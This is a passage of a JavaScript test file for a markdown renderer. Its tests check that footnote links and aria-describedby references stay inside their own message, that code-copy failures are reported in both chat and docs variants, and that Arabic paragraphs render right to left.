        assert.ok(hrefs.length >= 2)
        for (const h of hrefs) assert.ok(own.has(h), `#${h} points inside its own message`)
        const described = [...part.matchAll(/aria-describedby="([^"]+)"/g)].map((m) => m[1])
        for (const d of described) assert.ok(own.has(d), `aria-describedby ${d} is in its own message`)
    }
})

// ── failed copy is reported (LIBMD-6) ──
test('code copy in both variants reports a failure (no clipboard on plain-http origins)', () => {
    for (const controls of [CHAT_CONTROLS, DOCS_CONTROLS]) {
        assert.ok(typeof controls === 'object' && typeof controls.code === 'object')
        const copy = controls.code.copy
        assert.ok(typeof copy === 'object' && copy.onError === reportCopyError)
    }
    assert.match(COPY_FAILED, /HTTPS or localhost/)
})

// ── bidi: direction per block (LIBMD-5) ──
test('an Arabic paragraph renders right to left; English stays left to right', () => {
    const arabic = 'مرحبا بالعالم.'
    for (const html of [chat(`${arabic}\n\nHello world.\n\n\`\`\`py\nprint(1)\n\`\`\``), docs(`${arabic}\n\nHello world.`)]) {
        const rtl = [...html.matchAll(/dir="rtl"/g)].length
        assert.ok(rtl >= 1, 'the Arabic block is marked rtl')
        assert.match(html, new RegExp(`dir="rtl"[^>]*>(?:<[^>]+>)*${arabic}`))
        assert.doesNotMatch(html, /dir="rtl"[^>]*>(?:<[^>]+>)*Hello/)
    }
})
